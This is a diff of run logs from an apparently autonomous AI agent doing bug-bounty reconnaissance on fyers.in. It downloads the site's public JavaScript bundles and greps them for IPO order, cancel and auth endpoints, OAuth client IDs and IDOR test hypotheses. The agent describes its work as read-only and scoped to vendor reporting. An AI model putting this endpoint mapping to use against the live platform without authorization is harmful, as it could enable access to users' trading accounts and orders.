-- **Live gate re-confirmation (read-only, spaced, zero side-effect):** `journal-server/v1/notes-list` → HTTP 403 `{"code":401,"message":"unauthorized"}` (fingerprint #20); `nucleus/v1/history` + `history/abc123` → HTTP 401 `{"code":-1,...}` (fingerprint #21; earlier 503 was transient CF); `signup/v2/user/esign-document` POST `{}` → HTTP 401 `{"code":1050,"message":"Your session has expired..."}` (fingerprint #19 — esign path requires an authenticated signup session before any object logic).
-- **POC constraint honored:** only own-session baselines are researcher-executable; every cross-object substitution step is parameterized for FYERS Security Team validation (two internal test applicants). No OTP, no cross-account, no file/URL side effects.
-
-## API Endpoints (this run)
-- `api-a1-prod.fyers.in/journal-server/v1/notes-list` (GET, #20, 403)
-- `api-t1.fyers.in/nucleus/v1/history{/cid}` (GET, #21, 401)
-- `api-a1.fyers.in/signup/v2/user/esign-document` (GET `{}/POST`, #19, 401/1050)
-
-## Hypotheses
-### H13/H15/H17/H18/H19/H21 — all six conditional IDOR designs now carry exact shapes
-Reasoning: uniform auth-first gates prove route existence but nothing about per-object owner scoping; bundle-recovered request shapes give the Security Team drop-in, parameterized test designs.
-Impact: H17 Critical/High (req_id→eSign/PDF), H19 Medium–High (unauth upload/SSRF), H13/H15/H18 Medium–High, H21 Medium — all conditional, FYERS-side.
-Test: documented in E1–E6; researcher-executed only own baselines; NOT executed.
-
-## CVSS Candidates
-- [H17 signup/v2 req_id] — 8.1–9.1 (conditional) · [H19 api-testing-prod upload/SSRF] — 5.3–7.5 (conditional)
-- [H13/H15/H18] — 5.3–7.5 · [H21 nucleus] — 5.3–6.5 (conditional, FYERS-side)
-- [B1–B8 informational bundle] — informational/low
-
----
-## STATE UPDATE FOR NEXT RUN
-STATUS_TARGET: fyers.in
-STATUS_PHASE: POC
-STATUS_STATE: EXHAUSTED
-
-NEXT_STEP_1: Operator dispatches scope-confirmation query (package C1–C8) then submits `reports/submission-package_fyers-bb.md` (A1–A6 + B + C + D + E1–E6) via forms.fyers.in BugBountyForm1; no cross-account/OTP/SSRF execution by researcher.
-NEXT_STEP_2: If blocked on scope, restart RECON on unexplored in-scope surface — api.fyers.in/api/v2/* OAuth2 generate-authcode param validation, myaccount.fyers.in SPAs, automate-chn.fyers.in backtest family, ipo.fyers.in bundles — spaced, read-only.
-NEXT_STEP_3: Exclusions unchanged (SmartHunt SSTI false positive 4×, third-party hosts, api-a1.fydev.tech, public config artifacts); guardrails hold.
-
-===== RUN 2026-08-08 10:32:39 UTC =====
-Model: deepseek | Phase: POC | Target: fyers.in
-
-[0m
-> build · deepseek-v4-flash-free
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git log --oneline -3 && echo "===" && wc -l findings_deepseek.md && echo "===" && cat state_deepseek.json 2>/dev/null; echo; ls -la reports/
-54ef60c analyst fyers.in 2026-08-08-10-02
-===
-566 findings_deepseek.md
-===
-{"target": "fyers.in", "phase": "POC", "status": "EXHAUSTED", "next_steps": ["Operator dispatches scope-confirmation query (package C1\u2013C8) then submits `reports/submission-package_fyers-bb.md` (A1\u2013A6 + B + C + D + E1\u2013E6) via forms.fyers.in BugBountyForm1; no cross-account/OTP/SSRF execution by researcher.", "If blocked on scope, restart RECON on unexplored in-scope surface \u2014 api.fyers.in/api/v2/* OAuth2 generate-authcode param validation, myaccount.fyers.in SPAs, automate-chn.fyers.in backtest family, ipo.fyers.in bundles \u2014 spaced, read-only.", "Exclusions unchanged (SmartHunt SSTI false positive 4\u00d7, third-party hosts, api-a1.fydev.tech, public config artifacts); guardrails hold."]}
-total 32
-drwxr-xr-x 2 runner runner  4096 Aug  8 10:16 .
+ 4096 Aug  8 10:16 .
 drwxr-xr-x 8 runner runner  4096 Aug  8 10:16 ..
 -rw-r--r-- 1 runner runner  8119 Aug  8 10:16 analyst-latest.txt
 -rw-r--r-- 1 runner runner 14819 Aug  8 10:16 submission-package_fyers-bb.md
@@ -1338,6 +851,558 @@ Index: /home/runner/work/fyers-recon/fyers-recon/reports/analyst-latest.txt
 [0m✗ [0mEdit /home/runner/work/fyers7-recon/fyers-recon/reports/analyst-latest.txt failed
 [91m[1mError: [0mThe user rejected permission to use this specific tool call.
 
+===== RUN 2026-08-08 16:41:31 UTC =====
+Model: deepseek | Phase: POC | Target: fyers.in
+
+[0m
+> build · deepseek-v4-flash-free
+[0m
+[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git log --oneline -2 && echo "===" && cat state_deepseek.json 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; echo "==="; ls reports/
+704cd68 fix: valid python regex in verifier robot (no quote escaping)
+===
+{
+    "target": "fyers.in",
+    "phase": "POC",
+    "status": "IN_PROGRESS",
+    "next_steps": [
+        "SURFACE aip on api-i1 eIPO family \u2014 extract exact request/response shapes for place-order/order-book/cancel/issue-list from ipo SPA bundles (esp. /invest order-book body, tapi order-book 0/1 split, offer_details keying) \u2014 read-only.",
+        "SURFACE api-i1 eIPO family \u2014 extract exact request/response shapes for place-order/order-book/cancel/issue-list from ipo SPA bundles (esp. /invest order-book body, tapi order-book 0/1 split, offer_details keying) \u2014 read-only.",
+        "Operator extends scope-confirm with C9 + submits package (A1\u2013A7 + B + C + D + E + F) via official form; no pre-auth order placing.",
+        "Exclusions + guardrails unchanged."
+    ]
+}
+===
+analyst-latest.txt
+submission-package_fyers-bb.md
+[0m
+[0m$ [0mls -la /tmp/opencode/ 2>/dev/null; echo "==="; curl -sk --max-time 20 "https://ipo.fyers.in/_next/static/VL3OKIMlrhLnci-C89Be9/_buildManifest.js" | head -c 1500
+total 16
+drwxr-xr-x  2 runner runner  4096 Aug  8 16:37 .
+drwxrwxrwt 15 root   root   12288 Aug  8 16:37 ..
+===
+self.__BUILD_MANIFEST = (function(a){return {__rewrites:[],"/404":[a,"static\u002Fchunks\u002Fpages\u002F404-7b77ff825c27786d3b9b.js"],"/_error":["static\u002Fchunks\u002Fpages\u002F_error-04b08803d575952c8ed2.js"],"/details":["static\u002Fchunks\u002F75fc9c18.ccc0cedbfc497af63ab1.js",a,"static\u002Fchunks\u002Fpages\u002Fdetails-e985e9738dcfb33aedc9.js"],"/home":[a,"static\u002Fchunks\u002F61fe32111765d6645b96fc3d8e2e36f3b2d36f0c.f6fbd9dc97569273c050.js","static\u002Fchunks\u002Fpages\u002Fhome-93b303c9b1749ac441e1.js"],"/ipo":[a,"static\u002Fchunks\u002Fpages\u002Fipo-b60cad3bcfeaebcc0f0c.js"],"/orders":[a,"static\u002Fchunks\u002Fpages\u002Forders-4e41d0a397e63dd565a1.js"],"/updateipo":[a,"static\u002Fchunks\u002Fpages\u002Fupdateipo-25772df711cbcb844d21.js"],sortedPages:["\u002F404","\u002F_app","\u002F_error","\u002Fdetails","\u002Fhome","\u002Fipo","\u002Forders","\u002Fupdateipo"]}}("static\u002Fchunks\u002F5d803da5ef9d1718c712fe441612209655f8245f.99c7e57583a1a03459a9.js"));self.__BUILD_MANIFEST_CB && self.__BUILD_MANIFEST_CB()
+[0m
+[0m$ [0mcd /tmp/opencode && for p in "pages/orders-4e41d0a397e63dd565a1.js" "pages/ipo-b60cad3bcfeaebcc0f0c.js" "pages/updateipo-25772df711cbcb844d21.js" "pages/details-e985e9738dcfb33aedc9.js" "75fc9c18.ccc0cedbfc497af63ab1.js" "pages/home-93b303c9b1749ac441e1.js"; do n=$(echo $p | tr '/' '_'); curl -sk --max-time 40 -o "ipo_$n.js" "https://ipo.fyers.in/_next/static/chunks/$p"; echo "$p -> $(wc -c < ipo_$n.js) bytes"; sleep 2; done
+pages/orders-4e41d0a397e63dd565a1.js -> 20939 bytes
+pages/ipo-b60cad3bcfeaebcc0f0c.js -> 4521 bytes
+pages/updateipo-25772df711cbcb844d21.js -> 4506 bytes
+pages/details-e985e9738dcfb33aedc9.js -> 780192 bytes
+75fc9c18.ccc0cedbfc497af63ab1.js -> 174070 bytes
+pages/home-93b303c9b1749ac441e1.js -> 197079 bytes
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+for f in ['ipo_pages_orders-4e41d0a397e63dd565a1.js','ipo_pages_ipo-b60cad3bcfeaebcc0f0c.js','ipo_pages_updateipo-25772df711cbcb844d21.js']:
+    s=open(f,encoding='utf-8',errors='ignore').read()
+    print(f"########## {f} len {len(s)}")
+    for kw in ['order-book','place-order','cancel','offer','IssueId','OrderId','pageNumber','form','Form','bid','api/','Authorization','auth_token','client_id','dp_','/api/','/invest','/eipo']:
+        hits=[m.start() for m in re.finditer(re.escape(kw),s)]
+        if hits:
+            print(f"  [{kw}] {len(hits)}")
+            for m in hits[:2]:
+                print('     ...', ' '.join(s[max(0,m-90):m+140].split())[:230])
+EOF
+Traceback (most recent call last):
+  File "<stdin>", line 3, in <module>
+FileNotFoundError: [Errno 2] No such file or directory: 'ipo_pages_orders-4e41d0a397e63dd565a1.js'
+[0m
+[0m$ [0mcd /tmp/opencode && ls ipo_*; python3 - << 'EOF'
+import re
+for f in ['ipo_pages_orders-4e41d0a397e63dd565a1.js','ipo_pages_ipo-b60cad3bcfeaebcc0f0c.js','ipo_pages_updateipo-25772df711cbcb844d21.js']:
+    s=open(f,encoding='utf-8',errors='ignore').read()
+    print(f"########## {f} len {len(s)}")
+    for kw in ['order-book','place-order','cancel','offer','IssueId','OrderId','pageNumber','bid','Authorization','auth_token','/eipo','offer_list','offer_details']:
+        hits=[m.start() for m in re.finditer(re.escape(kw),s)]
+        if hits:
+            print(f"  [{kw}] {len(hits)}")
+            for m in hits[:2]:
+                print('     ...', ' '.join(s[max(0,m-90):m+140].split())[:230])
+EOF
+ipo_75fc9c18.ccc0cedbfc497af63ab1.js.js
+ipo_pages_details-e985e9738dcfb33aedc9.js.js
+ipo_pages_home-93b303c9b1749ac441e1.js.js
+ipo_pages_ipo-b60cad3bcfeaebcc0f0c.js.js
+ipo_pages_orders-4e41d0a397e63dd565a1.js.js
+ipo_pages_updateipo-25772df711cbcb844d21.js.js
+Traceback (most recent call last):
+  File "<stdin>", line 3, in <module>
+FileNotFoundError: [Errno 2] No such file or directory: 'ipo_pages_orders-4e41d0a397e63dd565a1.js'
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+fs=['ipo_pages_orders-4e41d0a397e63dd565a1.js.js','ipo_pages_ipo-b60cad3bcfeaebcc0f0c.js.js','ipo_pages_updateipo-25772df711cbcb844d21.js.js']
+for f in fs:
+    s=open(f,encoding='utf-8',errors='ignore').read()
+    print(f"########## {f} len {len(s)}")
+    for kw in ['order-book','place-order','cancel','offer','IssueId','OrderId','pageNumber','Authorization','auth_token','/eipo','offer_list','offer_details','client_id']:
+        hits=[m.start() for m in re.finditer(re.escape(kw),s)]
+        if hits:
+            print(f"  [{kw}] {len(hits)}")
+            for m in hits[:2]:
+                print('     ...', ' '.join(s[max(0,m-90):m+140].split())[:230])
+EOF
+########## ipo_pages_orders-4e41d0a397e63dd565a1.js.js len 20939
+  [cancel] 2
+     ... !!n.leading,o=(s="maxWait"in n)?k(E(n.maxWait)||0,t):o,d="trailing"in n?!!n.trailing:d),g.cancel=function(){void 0!==u&&clearTimeout(u),f=0,r=c=i=u=void 0},g.flush=function(){return void 0===u?a:y(T())},g}function x(e){var t=typeo
+     ... ispatchSizes()}},{key:"componentWillUnmount",value:function(){this.throttledDispatchSizes.cancel(),window.removeEventListener("resize",this.throttledDispatchSizes)}},{key:"render",value:function(){var t=this.props,r=(t.fallbackHei
+  [IssueId] 1
+     ... }, { id: 2, name: "Upcoming" }, { id: 3, name: "Past" }]; var InitialObj = { IPOIssueId: "", IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", Applicatio
+  [auth_token] 1
+     ... ion () { if (true) { if (localStorage.clientId) { setToken(localStorage.auth_token); setClientId(localStorage.clientId); setClientName(localStorage.clientName); setDPAccountStatus(localSto
+  [client_id] 4
+     ... 2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&response_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/gener
+     ... onse_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=68USODQMOF-101&redirect_uri=https://invest-dev.fydev.tech&response_type=code&state=abcdefg" : isStaging ? "https://api-t1.fyers.in
+########## ipo_pages_ipo-b60cad3bcfeaebcc0f0c.js.js len 4521
+  [auth_token] 1
+     ... ion () { if (true) { if (localStorage.clientId) { setToken(localStorage.auth_token); setClientId(localStorage.clientId); setClientName(localStorage.clientName); setDPAccountStatus(localSto
+########## ipo_pages_updateipo-25772df711cbcb844d21.js.js len 4506
+  [auth_token] 1
+     ... ion () { if (true) { if (localStorage.clientId) { setToken(localStorage.auth_token); setClientId(localStorage.clientId); setClientName(localStorage.clientName); setDPAccountStatus(localSto
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+s=open('ipo_pages_orders-4e41d0a397e63dd565a1.js.js',encoding='utf-8',errors='ignore').read()
+i=s.find('InitialObj')
+print("=== InitialObj block ===")
+print(' '.join(s[i:i+700].split())[:900])
+print()
+for kw in ['REDIRECT_LOGIN_URL','isprod','isdev','isStaging','EFR7964223','appIdHash','isProd','64','client_id=']:
+    for m in list(re.finditer(re.escape(kw),s))[:2]:
+        j=m.start()
+        print(f"### {kw} ::", ' '.join(s[max(0,j-120):j+220].split())[:340])
+        print('  ---')
+EOF
+=== InitialObj block ===
+InitialObj; }); //------------------------Prod--------------------- var isprod = 1; var isdev = 0; var isStaging = 0; //------------------------------------------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //------------------------------------------------- // // Staging------------------------------------------ // const isprod = 0; // const isdev = 0; // const isStaging = 1 // //localhost ---------------------------------------- // const isprod = 0; // const isdev = 0; // const isStaging = 0 // //-------------------------------------------------- // // APP ID // // ENV configration var ENV = isprod ? "isProd
+
+### REDIRECT_LOGIN_URL :: { return APP_ID; }); /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "g", function() { return REDIRECT_LOGIN_URL; }); /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "j", function() { return appIdHash; }); /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "h", fun
+  ---
+### REDIRECT_LOGIN_URL :: ng" : "isDev"; var APP_ID = isprod ? "EFR7964223" : isdev ? "68USODQMOF" : isStaging ? "ZT6P4L9YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&response_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/gener
+  ---
+### isprod :: d(__webpack_exports__, "c", function() { return InitialObj; }); //------------------------Prod--------------------- var isprod = 1; var isdev = 0; var isStaging = 0; //------------------------------------------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //-
+  ---
+### isprod :: g = 0; //------------------------------------------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //------------------------------------------------- // // Staging------------------------------------------ // const isprod = 0; // const isdev = 0; // const isSt
+  ---
+### isdev :: rts__, "c", function() { return InitialObj; }); //------------------------Prod--------------------- var isprod = 1; var isdev = 0; var isStaging = 0; //------------------------------------------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //-----------------
+  ---
+### isdev :: ------------------------------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //------------------------------------------------- // // Staging------------------------------------------ // const isprod = 0; // const isdev = 0; // const isStaging = 1 // //localh
+  ---
+### isStaging :: ction() { return InitialObj; }); //------------------------Prod--------------------- var isprod = 1; var isdev = 0; var isStaging = 0; //------------------------------------------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //--------------------------------
+  ---
+### isStaging :: ----------------- //dev---------------------------------------------- // const isprod = 0; // const isdev = 1; // const isStaging = 0 // //------------------------------------------------- // // Staging------------------------------------------ // const isprod = 0; // const isdev = 0; // const isStaging = 1 // //localhost ----------------
+  ---
+### EFR7964223 :: APP ID // // ENV configration var ENV = isprod ? "isProd" : isStaging ? "isStaging" : "isDev"; var APP_ID = isprod ? "EFR7964223" : isdev ? "68USODQMOF" : isStaging ? "ZT6P4L9YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in
+  ---
+### EFR7964223 :: 6P4L9YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&response_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=68USODQMOF-101&redirect_uri=https://invest-dev.fydev.tech&response_
+  ---
+### appIdHash :: IRECT_LOGIN_URL; }); /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "j", function() { return appIdHash; }); /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "h", function() { return REDIRECT_URL; }); /* unused harmony export AUTH_URL */ /* harmony export (binding) */ __webpack_require__.
+  ---
+### appIdHash :: 3/generate-authcode?client_id=H4NMJ8X2NR-101&redirect_uri=http://localhost:2005/&response_type=code&state=abcdefg"; var appIdHash = isprod ? "2a88a14a353274a2f35430038b6d81725e2d17d8064785d62965e4da78033e9f" : isdev ? "45ac1f5f538de93ff8a4e2ad77214266b04db8dbf50fabdaecc7a3ffadf60ad0" : isStaging ? "1260e9be57e09bf77b06e322504fbf042164d405
+  ---
+### isProd :: ng = 0 // //-------------------------------------------------- // // APP ID // // ENV configration var ENV = isprod ? "isProd" : isStaging ? "isStaging" : "isDev"; var APP_ID = isprod ? "EFR7964223" : isdev ? "68USODQMOF" : isStaging ? "ZT6P4L9YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate
+  ---
+### 64 :: ID // // ENV configration var ENV = isprod ? "isProd" : isStaging ? "isStaging" : "isDev"; var APP_ID = isprod ? "EFR7964223" : isdev ? "68USODQMOF" : isStaging ? "ZT6P4L9YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&resp
+  ---
+### 64 :: YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&response_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=68USODQMOF-101&redirect_uri=https://invest-dev.fydev.tech&response_type=
+  ---
+### client_id= :: ging ? "ZT6P4L9YQB" : "H4NMJ8X2NR"; var REDIRECT_LOGIN_URL = isprod ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=EFR7964223-101&redirect_uri=https://ipo.fyers.in&response_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=68USODQMOF-101&redirect_uri=https://invest-dev.fydev.tech
+  ---
+### client_id= :: _uri=https://ipo.fyers.in&response_type=code&state=abcdefg" : isdev ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=68USODQMOF-101&redirect_uri=https://invest-dev.fydev.tech&response_type=code&state=abcdefg" : isStaging ? "https://api-t1.fyers.in/api/v3/generate-authcode?client_id=ZT6P4L9YQB-101&redirect_uri=https://ipo.fyer
+  ---
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+s=open('ipo_pages_details-e985e9738dcfb33aedc9.js.js',encoding='utf-8',errors='ignore').read()
+print(f"len {len(s)}")
+for kw in ['BidDetails','FormRanges','order-book','place-order','createIPOOrder','ModifyOrder','getParticularOrderDetails','getOrdersList','issue-list','issue-details','investors-details','offer_details','offer_list','cancel-order','modify-order','UPIID','FormFromId','FormToId','InitialObj','/api/v3/validate-authcode']:
+    hits=[m.start() for m in re.finditer(re.escape(kw),s)]
+    if hits:
+        print(f"\n### [{kw}] {len(hits)}")
+        for m in hits[:2]:
+            print('   ...', ' '.join(s[max(0,m-100):m+180].split())[:260])
+EOF
+len 745081
+
+### [BidDetails] 1
+   ... IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount: "", PayableAmount: "1000", OrderStatus: "455", OrderType: 1, Remarks: "", FormRanges: "", InitialChequeNo: "0", BrokerRefNo: "",
+
+### [FormRanges] 1
+   ... licationAmount: "", PayableAmount: "1000", OrderStatus: "455", OrderType: 1, Remarks: "", FormRanges: "", InitialChequeNo: "0", BrokerRefNo: "", SubBrokerCode: "", ARN: "", PaymentMode: "", RMCode: "", IsEmp: "False", EmpCode: "", StartChequeNo: "",
+
+### [order-book] 3
+   ... token: true }, // To get Particular Order Details getParticularOrderDetails: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-book", method: "post", baseURL: "no
+   ... , baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // // Offer API's // Place Order createOrder: { api: prifix + "/place-order", method: "po
+
+### [place-order] 3
+   ... et", baseURL: "normal", token: true }, // To place order createIPOOrder: { api: "/place-order", method: "post", baseURL: "normal", token: true }, // To modify placed order ModifyOrder: { api: "/place-order", method: "post", baseURL:
+   ... baseURL: "normal", token: true }, // To modify placed order ModifyOrder: { api: "/place-order", method: "post", baseURL: "normal", token: true }, // To get Particular Order Details getParticularOrderDetails: { api: "/order-book", method
+
+### [createIPOOrder] 2
+   ... tors-details", method: "get", baseURL: "normal", token: true }, // To place order createIPOOrder: { api: "/place-order", method: "post", baseURL: "normal", token: true }, // To modify placed order ModifyOrder: { api: "/place-order",
+   ... esolve, reject) { api_api(IPOactions_objectSpread(IPOactions_objectSpread({}, IPO_API.createIPOOrder), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) {
+
+### [ModifyOrder] 2
+   ... der", method: "post", baseURL: "normal", token: true }, // To modify placed order ModifyOrder: { api: "/place-order", method: "post", baseURL: "normal", token: true }, // To get Particular Order Details getParticularOrderDetails: { api:
+   ... esolve, reject) { api_api(IPOactions_objectSpread(IPOactions_objectSpread({}, IPO_API.ModifyOrder), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) { va
+
+### [getParticularOrderDetails] 5
+   ... estorDetails; }); __webpack_require__.d(__webpack_exports__, "n", function() { return /* binding */ getParticularOrderDetails; }); __webpack_require__.d(__webpack_exports__, "b", function() { return /* binding */ CreateIPOOrder; }); __webpack_require__.d(__web
+   ... method: "post", baseURL: "normal", token: true }, // To get Particular Order Details getParticularOrderDetails: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-boo
+
+### [getOrdersList] 2
+   ... er-book", method: "post", baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // // Offer API's // Place Order createOrder: { api: prifix + "/p
+   ... esolve, reject) { api_api(IPOactions_objectSpread(IPOactions_objectSpread({}, IPO_API.getOrdersList), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) {
+
+### [issue-list] 1
+   ... : ./services/apiVariables.js var IPO_API = { // To get IPOs list getOngoingIPOs: { url: "/issue-list", method: "get", baseURL: "normal", query: { IssueId: null, IsActive: null }, get api() { return this.url + generateQuery(this.que
+
+### [issue-details] 1
+   ... e; this.query[key] = value; } }, // To get IPO Details getIPODetails: { url: "/issue-details", method: "get", baseURL: "normal", query: { IssueId: null }, get api() { return this.url + generateQuery(this.query); }, se
+
+### [investors-details] 2
+   ... his.query[key] = value; } }, // To get Investor Details getInvestorDetails: { api: "/investors-details", method: "get", baseURL: "normal", token: true }, // To place order createIPOOrder: { api: "/place-order", method: "post", baseURL:
+   ... oken: true }, // To get My Account Investor Details getMyAccountInvestorDetails: { api: "/investors-details", method: "get", baseURL: "common", token: true }, // To get Offers list getOffers: { url: "/offer_list", method: "get", baseURL: "i
+
+### [offer_details] 1
+   ... ue; this.query[key] = value; } }, // To get Details getOfferDetails: { url: "/offer_details", method: "get", baseURL: "ipo", // token: true, query: { offer_type: null, offer_id: null }, get api() { return this.url +
+
+### [offer_list] 1
+   ... get", baseURL: "common", token: true }, // To get Offers list getOffers: { url: "/offer_list", method: "get", baseURL: "ipo", query: { offer_type: null, is_active: null }, get api() { return this.url + generateQuery(this.qu
+
+### [cancel-order] 1
+   ... baseURL: "common", token: true }, // To Cancel order cancelOrder: { url: prifix + "/cancel-order", method: "delete", baseURL: "common", token: true, query: { order_id: null, offer_id: null }, get api() { return this.url +
+
+### [modify-order] 1
+   ... RL: "common", token: true }, // To modify SME order ModifySMEOrder: { api: prifix + "/modify-order", method: "put", baseURL: "common", token: true }, // To Cancel order cancelOrder: { url: prifix + "/cancel-order", method: "delete", bas
+
+### [UPIID] 1
+   ... : "", IsEmp: "False", EmpCode: "", StartChequeNo: "", EndChequeNo: "", RequestedBy: "", UPIID: "", BankAccountNo: "", IFSC: "", Filler: "", ClientCategory: "", OrderSource: "WEB", AMOStatus: "AMO", AcceptedStatus: "ACCEPTED", pdiscountStatus: false,
+
+### [InitialObj] 2
+   ... /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "c", function() { return InitialObj; }); //------------------------Prod--------------------- var isprod = 1; var isdev = 0; var isStaging = 0; //-----------------------------------------
+   ... [{ id: 1, name: "Ongoing" }, { id: 2, name: "Upcoming" }, { id: 3, name: "Past" }]; var InitialObj = { IPOIssueId: "", IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount: "", Payab
+
+### [/api/v3/validate-authcode] 2
+   ... tps://ipo.fyers.co.in/' : "http://localhost:2005/"; var AUTH_URL = isprod ? "https://api-t1.fyers.in/api/v3/validate-authcode" : "https://api-t1.fyers.co.in/api/v3/validate-authcode"; var OPEN_ACCOUNT_URL = "https://signup.fyers.in/?utm_source=Organic&utm_medi
+   ... AUTH_URL = isprod ? "https://api-t1.fyers.in/api/v3/validate-authcode" : "https://api-t1.fyers.co.in/api/v3/validate-authcode"; var OPEN_ACCOUNT_URL = "https://signup.fyers.in/?utm_source=Organic&utm_medium=IPO_Portal&utm_campaign=Navigation_CTA"; var OPEN_ACC
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - << 'EOF'
+import re
+s=open('ipo_pages_details-e985e9738dcfb33aedc9.js.js',encoding='utf-8',errors='ignore').read()
+i=s.find('var InitialObj = {')
+print("=== FULL InitialObj ===")
+print(' '.join(s[i:i+900].split())[:1200])
+print()
+# order-book body construction: find uses of getOffersOrdersList / getOrdersList / getParticularOrderDetails call
+for kw in ['getOffersOrdersList','getOrdersList','getParticularOrderDetails','CreateIPOOrder','placeIPOOrder','api_service(']:
+    for m in list(re.finditer(re.escape(kw),s))[:3]:
+        j=m.start()
+        print(f"### {kw} ::", ' '.join(s[max(0,j-130):j+180].split())[:320])
+        print('  ---')
+EOF
+=== FULL InitialObj ===
+var InitialObj = { IPOIssueId: "", IsNRI: "0", DPIdBeneficiary: "", IsCutOff: "0", IsPartial: "0", PartialAmount: "1000", BidDetails: "", ApplicationAmount: "", PayableAmount: "1000", OrderStatus: "455", OrderType: 1, Remarks: "", FormRanges: "", InitialChequeNo: "0", BrokerRefNo: "", SubBrokerCode: "", ARN: "", PaymentMode: "", RMCode: "", IsEmp: "False", EmpCode: "", StartChequeNo: "", EndChequeNo: "", RequestedBy: "", UPIID: "", BankAccountNo: "", IFSC: "", Filler: "", ClientCategory: "", OrderSource: "WEB", AMOStatus: "AMO", AcceptedStatus: "ACCEPTED", pdiscountStatus: false, discountPercentage: false, discount: 0 }; /***/ }), /***/ "4dOw": /***/ (function(module, exports, __webpack_require__) { //! moment.js locale configuration //! locale : English (Ireland) [en-ie] //! author : Chris Cartlidge : https://githu
+
+### getOffersOrdersList :: { var key = _ref3.key, value = _ref3.value; this.query[key] = value; } }, // To get Orders list getOffersOrdersList: { api: prifix + "/order-book", method: "post", baseURL: "common", token: true }, // To get My Account Investor Details getMyAccountInvest
+  ---
+### getOffersOrdersList :: turn", new Promise(function (resolve, reject) { api_api(IPOactions_objectSpread(IPOactions_objectSpread({}, IPO_API.getOffersOrdersList), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) {
+  ---
+### getOrdersList :: OrderDetails: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // To get Orders list getOrdersList: { api: "/order-book", method: "post", baseURL: "normal", token: true }, // // Offer API's // Place Order createOrder: { api: prifix + "/p
+  ---
+### getOrdersList :: turn", new Promise(function (resolve, reject) { api_api(IPOactions_objectSpread(IPOactions_objectSpread({}, IPO_API.getOrdersList), {}, { body: body })).then(function (res) { resolve(res); })["catch"](function (error) {
+  ---
+### getParticularOrderDetails :: * binding */ IPOactions_GetInvestorDetails; }); __webpack_require__.d(__webpack_exports__, "n", function() { return /* binding */ getParticularOrderDetails; }); __webpack_require__.d(__webpack_exports__, "b", function() { return /* binding */ CreateIPOOrder; }); __webpack_require__.d(__webpack_exports__, "m",
+  ---
